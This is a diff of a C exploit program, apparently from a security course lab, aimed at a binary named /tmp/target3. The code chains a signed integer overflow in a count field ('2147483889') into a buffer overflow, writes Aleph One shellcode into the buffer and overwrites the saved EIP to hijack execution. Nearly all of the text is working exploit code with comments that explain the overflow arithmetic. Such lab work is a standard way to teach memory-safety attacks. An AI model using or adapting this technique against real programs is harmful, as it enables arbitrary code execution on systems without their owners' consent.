@@ -4,8 +4,9 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target3"
-#define NOOP 0x90
+#define TARGET 		 "/tmp/target3"
+#define NOOP 		 0x90
+#define INT_OVERFLOW "2147483889"
 
 int main(void)
 {
@@ -19,10 +20,11 @@ int main(void)
 
   //2.  pick count = 2147483889 which when assigned to signed integer will overflow and make it -2147483407
   //2.1 when 2147483407 * 20  will again overflow the integer and result in 4280 which is good enough to overwrite EIP
-  strncpy(buf, "2147483880,", 11);
+  strncpy(buf, INT_OVERFLOW, 10);
+  strncpy(buf + 10, ",", 1);
 
   //3. add shellcode from alephone
-  strncpy(buf + (235*20), shellcode, 45);
+  strncpy(buf + (235*10), shellcode, 45);
 
   //4. new EIP pointing to our landing address somewhere in buffer. 
   strncpy(buf + (240*20) + 15, "\x20", 1);
